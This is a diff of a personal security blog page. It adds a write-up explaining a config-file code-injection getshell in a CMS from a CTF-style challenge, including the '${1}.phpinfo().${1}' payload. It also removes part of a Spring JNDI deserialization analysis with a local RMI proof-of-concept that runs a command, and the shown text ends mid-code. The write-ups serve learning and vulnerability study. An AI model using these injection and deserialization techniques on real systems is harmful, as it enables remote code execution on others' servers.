@@ -317,6 +317,165 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/EIS-yzmcms-getshell/index.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/EIS-yzmcms-getshell/index.html" itemprop="url">
+                  EIS_yzmcms_getshell
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-11-26 16:43:43 / Modified: 17:04:16" itemprop="dateCreated datePublished" datetime="2019-11-26T16:43:43+08:00">2019-11-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>EIS中有一道cms 后台getshell的实战类题目，其中写入配置文件从而getshell的方式很经典，这里简单一下这个getshell的原理，仅作学习</p>
+</blockquote>
+<p>来看写入配置文件的逻辑,全局搜索file_put_contents就可以找到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置config文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $config 配置信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_config</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">	$configfile = YZMPHP_PATH.<span class="string">'common'</span>.DIRECTORY_SEPARATOR.<span class="string">'config/config.php'</span>;</span><br><span class="line">	<span class="keyword">if</span>(!is_writable($configfile)) showmsg(<span class="string">'Please chmod '</span>.$configfile.<span class="string">' to 0777 !'</span>, <span class="string">'stop'</span>);</span><br><span class="line">	$pattern = $replacement = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">foreach</span>($config <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">		$pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br><span class="line">		$replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;					</span><br><span class="line">	&#125;</span><br><span class="line">	$str = file_get_contents($configfile);</span><br><span class="line">	$str = preg_replace($pattern, $replacement, $str);</span><br><span class="line">	<span class="keyword">return</span> file_put_contents($configfile, $str, LOCK_EX);		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Config.php的内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="comment">//系统配置</span></span><br><span class="line">    <span class="string">'site_theme'</span>         =&gt; <span class="string">'default'</span>,    <span class="comment">//站点默认主题目录</span></span><br><span class="line">    <span class="string">'url_html_suffix'</span>    =&gt; <span class="string">'.html'</span>,      <span class="comment">//URL伪静态后缀</span></span><br><span class="line">    <span class="string">'set_pathinfo'</span>       =&gt; <span class="keyword">false</span>,         <span class="comment">//Nginx默认不支持PATHINFO模式，需配置此项为true，则Nginx可支持PATHINFO，系统默认为false</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//数据库配置</span></span><br><span class="line">    <span class="string">'db_type'</span> =&gt; <span class="string">'pdo'</span>,     	  <span class="comment">// 数据库链接扩展 , 支持 pdo | mysqli | mysql</span></span><br><span class="line">    <span class="string">'db_host'</span> =&gt; <span class="string">'mysql'</span>,  <span class="comment">// 服务器地址</span></span><br><span class="line">    <span class="string">'db_name'</span> =&gt; <span class="string">'yzmcms'</span>,		<span class="comment">// 数据库名</span></span><br><span class="line">    <span class="string">'db_user'</span> =&gt; <span class="string">'root'</span>,       <span class="comment">// 用户名</span></span><br><span class="line">    <span class="string">'db_pwd'</span> =&gt; <span class="string">'root@3556'</span>,       		<span class="comment">// 密码</span></span><br><span class="line">    <span class="string">'db_port'</span> =&gt; <span class="number">3306</span>,         <span class="comment">// 端口</span></span><br><span class="line">    <span class="string">'db_prefix'</span> =&gt; <span class="string">'yzm_'</span>,        <span class="comment">// 数据库表前缀</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//路由配置</span></span><br><span class="line">    <span class="string">'route'</span>              =&gt; <span class="keyword">array</span>(<span class="string">'m'</span> =&gt; <span class="string">'index'</span>, <span class="string">'c'</span> =&gt; <span class="string">'index'</span>, <span class="string">'a'</span> =&gt; <span class="string">'init'</span>),  <span class="comment">//默认加载配置，基中“m”为模块,“c”为控制器，“a”为方法</span></span><br><span class="line">    <span class="string">'route_mapping'</span>      =&gt; <span class="keyword">true</span>,         <span class="comment">//是否开启路由映射</span></span><br><span class="line">    <span class="comment">//路由映射规则</span></span><br><span class="line">    <span class="string">'route_rules'</span>        =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Cookie配置</span></span><br><span class="line">    <span class="string">'cookie_domain'</span>      =&gt; <span class="string">''</span>,           <span class="comment">//Cookie 作用域</span></span><br><span class="line">    <span class="string">'cookie_path'</span>        =&gt; <span class="string">'/'</span>,          <span class="comment">//Cookie 作用路径</span></span><br><span class="line">    <span class="string">'cookie_ttl'</span>         =&gt; <span class="number">0</span>,            <span class="comment">//Cookie 生命周期，0 表示随浏览器进程</span></span><br><span class="line">    <span class="string">'cookie_pre'</span>         =&gt; <span class="string">'yzmphp_'</span>,    <span class="comment">//Cookie 前缀，同一域名下安装多套系统时，请修改Cookie前缀</span></span><br><span class="line">    <span class="string">'cookie_secure'</span>      =&gt; <span class="keyword">false</span>,        <span class="comment">//是否通过安全的 HTTPS 连接来传输 cookie</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//缓存配置</span></span><br><span class="line">    <span class="string">'cache_type'</span>         =&gt; <span class="string">'file'</span>,     	<span class="comment">// 缓存类型【暂支持 file , redis , memcache 】</span></span><br><span class="line">    <span class="comment">//缓存类型为file缓存时的配置项</span></span><br><span class="line">    <span class="string">'file_config'</span>        =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'cache_dir'</span>      =&gt; YZMPHP_PATH.<span class="string">'cache/chche_file/'</span>,    <span class="comment">//缓存文件目录</span></span><br><span class="line">		<span class="string">'suffix'</span>         =&gt; <span class="string">'.cache.php'</span>,  <span class="comment">//缓存文件后缀</span></span><br><span class="line">		<span class="string">'mode'</span>           =&gt; <span class="string">'2'</span>,           <span class="comment">//缓存格式：mode 1 为serialize序列化, mode 2 为保存为可执行文件array</span></span><br><span class="line">    ), </span><br><span class="line">    <span class="comment">//缓存类型为redis缓存时的配置项</span></span><br><span class="line">    <span class="string">'redis_config'</span>       =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'host'</span>           =&gt; <span class="string">'127.0.0.1'</span>,    <span class="comment">// redis主机</span></span><br><span class="line">		<span class="string">'port'</span>           =&gt; <span class="number">6379</span>,           <span class="comment">// redis端口</span></span><br><span class="line">		<span class="string">'password'</span>       =&gt; <span class="string">''</span>,             <span class="comment">// 密码</span></span><br><span class="line">		<span class="string">'select'</span>         =&gt; <span class="number">0</span>,              <span class="comment">// 操作库</span></span><br><span class="line">		<span class="string">'timeout'</span>        =&gt; <span class="number">0</span>,              <span class="comment">// 超时时间(秒)</span></span><br><span class="line">		<span class="string">'expire'</span>         =&gt; <span class="number">3600</span>,           <span class="comment">// 有效期(秒)</span></span><br><span class="line">		<span class="string">'persistent'</span>     =&gt; <span class="keyword">false</span>,          <span class="comment">// 是否长连接</span></span><br><span class="line">		<span class="string">'prefix'</span>         =&gt; <span class="string">''</span>,             <span class="comment">// 前缀</span></span><br><span class="line">    ), </span><br><span class="line">    <span class="comment">//缓存类型为memcache缓存时的配置项</span></span><br><span class="line">    <span class="string">'memcache_config'</span>    =&gt; <span class="keyword">array</span> (</span><br><span class="line">		<span class="string">'host'</span>           =&gt; <span class="string">'127.0.0.1'</span>,    <span class="comment">// memcache主机</span></span><br><span class="line">		<span class="string">'port'</span>           =&gt; <span class="number">11211</span>,          <span class="comment">// memcache端口</span></span><br><span class="line">		<span class="string">'timeout'</span>        =&gt; <span class="number">0</span>,              <span class="comment">// 超时时间(秒)</span></span><br><span class="line">		<span class="string">'expire'</span>         =&gt; <span class="number">3600</span>,           <span class="comment">// 有效期(秒)</span></span><br><span class="line">		<span class="string">'persistent'</span>     =&gt; <span class="keyword">false</span>,          <span class="comment">// 是否长连接</span></span><br><span class="line">		<span class="string">'prefix'</span>         =&gt; <span class="string">''</span>,             <span class="comment">// 前缀</span></span><br><span class="line">    ),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//系统语言</span></span><br><span class="line">    <span class="string">'language'</span>           =&gt; <span class="string">'zh_cn'</span>,      <span class="comment">//【暂支持 简体中文zh_cn 和 美式英语en_us】</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//附件相关配置</span></span><br><span class="line">    <span class="string">'upload_file'</span>        =&gt; <span class="string">'uploads'</span>,    <span class="comment">//上传文件目录，后面一定不要加斜杠（“/”）</span></span><br><span class="line">    <span class="string">'watermark_enable'</span>   =&gt; <span class="string">'1'</span>,          <span class="comment">//是否开启图片水印</span></span><br><span class="line">    <span class="string">'watermark_name'</span>     =&gt; <span class="string">'mark.png'</span>,   <span class="comment">//水印名称</span></span><br><span class="line">    <span class="string">'watermark_position'</span> =&gt; <span class="string">'9'</span>,          <span class="comment">//水印位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//其他设置</span></span><br><span class="line">    <span class="string">'sql_execute'</span>        =&gt; <span class="keyword">false</span>,        <span class="comment">//是否允许在线执行SQL命令</span></span><br><span class="line">    <span class="string">'edit_template'</span>      =&gt; <span class="keyword">false</span>,        <span class="comment">//是否允许在线编辑模板</span></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的逻辑是正则匹配出原<code>config.php</code>文件的key=&gt;value对，然后替换为新的配置。</p>
+<p>这个cms存在全局过滤，过滤机制类似phpcms的过滤函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到我们想要的单引号被过滤了，没有办法直接拼接单引号来注入代码到config.php中。</p>
+<p>然而可以注意到replacement的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;</span><br></pre></td></tr></table></figure>
+<p>再查看我们的匹配正则</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1574758722/blog/下载_pdhepw.png" alt="https://res.cloudinary.com/durtftgrv/image/upload/v1574758722/blog/%E4%B8%8B%E8%BD%BD_pdhepw.png"></p>
+<p>可以看到匹配到的<code>${1}</code>正是单引号本身，因此我们只要添加值为<code>${1}.phpinfo().${1}</code>即可重新引入被</p>
+<p>过滤掉的单引号，从而逃逸出来成功注入任意代码。</p>
+<p>参考文档</p>
+<p><a href="https://blog.wonderkun.cc/2017/02/28/php写入配置文件的经典漏洞/">https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson1-2-47反序列化分析/index.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2053,187 +2212,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/java-unserialize-learning-2/index.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/java-unserialize-learning-2/index.html" itemprop="url">
-                  Spring-jndi 反序列化漏洞分析复现
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-02-11 17:35:22" itemprop="dateCreated datePublished" datetime="2019-02-11T17:35:22+08:00">2019-02-11</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-22 08:32:27" itemprop="dateModified" datetime="2019-03-22T08:32:27+08:00">2019-03-22</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>打包发布于安全客<a href="https://www.anquanke.com/post/id/173459">https://www.anquanke.com/post/id/173459</a></p>
-</blockquote>
-<h2 id="spring-jndi反序列化"><a href="#spring-jndi反序列化" class="headerlink" title="spring-jndi反序列化"></a>spring-jndi反序列化</h2><p>众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的<code>org.springframeworkl.transation.jta.JtaTransationManager</code>类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。</p>
-<h3 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h3><p><code>JNDI</code>(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。</p>
-<p>这里我们给出在java下的一段提供JNDI服务的代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8086</span>), <span class="number">0</span>);</span><br><span class="line">httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">httpServer.start();</span><br><span class="line">			</span><br><span class="line">System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.01:8086/"</span>);</span><br><span class="line">ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
-<p>这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对<code>ExportObject</code>类的查询，这里ExportObject类的源码为：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其功能便是执行我们验证rce时常用的调用计算器的功能。</p>
-<p>要加载ExportObject类我们可以使用以下的代码:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context ctx=<span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(<span class="string">"rmi://127.0.0.1:1099/Object"</span>);</span><br><span class="line"><span class="comment">//System.out.println("loaded obj");</span></span><br></pre></td></tr></table></figure>
-<p>执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。</p>
-<h3 id="Spring框架中的JNDI反序列化漏洞"><a href="#Spring框架中的JNDI反序列化漏洞" class="headerlink" title="Spring框架中的JNDI反序列化漏洞"></a>Spring框架中的JNDI反序列化漏洞</h3><p>导致JNDI反序列化问题的类主要是<code>org.springframework.transaction.jta.JtaTransactionManager</code>类。跟进该类的源码中的<code>readObject()</code>函数:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</span><br><span class="line">        <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</span><br><span class="line">        <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>继续跟进<code>initUserTransactionAndTransactionManager()</code>函数</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</span><br><span class="line">            <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.autodetectUserTransaction) &#123;</span><br><span class="line">                <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.findUserTransaction();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>继续进一步跟进<code>lookupUserTransaction()</code>函数</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到最终<code>return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class)</code>,跟进<code>JndiTemplate</code>类的<code>lookup</code>方法,</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.debug(<span class="string">"Looking up JNDI object with name ["</span> + name + <span class="string">"]"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.execute(<span class="keyword">new</span> JndiCallback&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">doInContext</span><span class="params">(Context ctx)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            Object located = ctx.lookup(name);</span><br><span class="line">            <span class="keyword">if</span> (located == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(<span class="string">"JNDI object with ["</span> + name + <span class="string">"] not found: JNDI implementation returned null"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> located;</span><br><span class="line">            &#125;</span><br><span 